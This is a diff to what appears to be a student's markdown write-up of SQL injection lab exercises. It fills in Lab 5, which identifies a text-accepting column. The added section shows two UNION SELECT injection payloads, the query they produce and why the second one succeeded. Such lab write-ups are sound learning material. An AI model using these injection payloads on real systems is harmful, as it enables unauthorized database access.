@@ -72,12 +72,22 @@ ORDER BY 4 caused an error, while ORDER BY 3 worked. This showed that the query 
 
 ## Lab 5 – Find a Column Containing Text
 
-**Payload:**
+**Payloads tested:**
+- `Tech gifts' UNION SELECT 'u0srAH',NULL,NULL--` – Error
+- `Tech gifts' UNION SELECT NULL,'u0srAH',NULL--` – Worked
 
-**SQL query produced:**
+**Final payload:** `Tech gifts' UNION SELECT NULL,'u0srAH',NULL--`
+
+**SQL query produced (approximate):**
+
+SELECT col1, col2, col3 FROM products
+WHERE category = 'Tech gifts'
+UNION SELECT NULL, 'u0srAH', NULL--';
 
 **Why it worked:**
+The first column did not accept text and returned an error. The second column accepted the string because its data type supports text. NULL was used for the other columns to avoid data type conflicts.
 
+**Result:** Lab solved successfully. Column 2 accepts text.
 ## Lab 6 – Retrieve Multiple Values in One Column
 
 **Payload:**
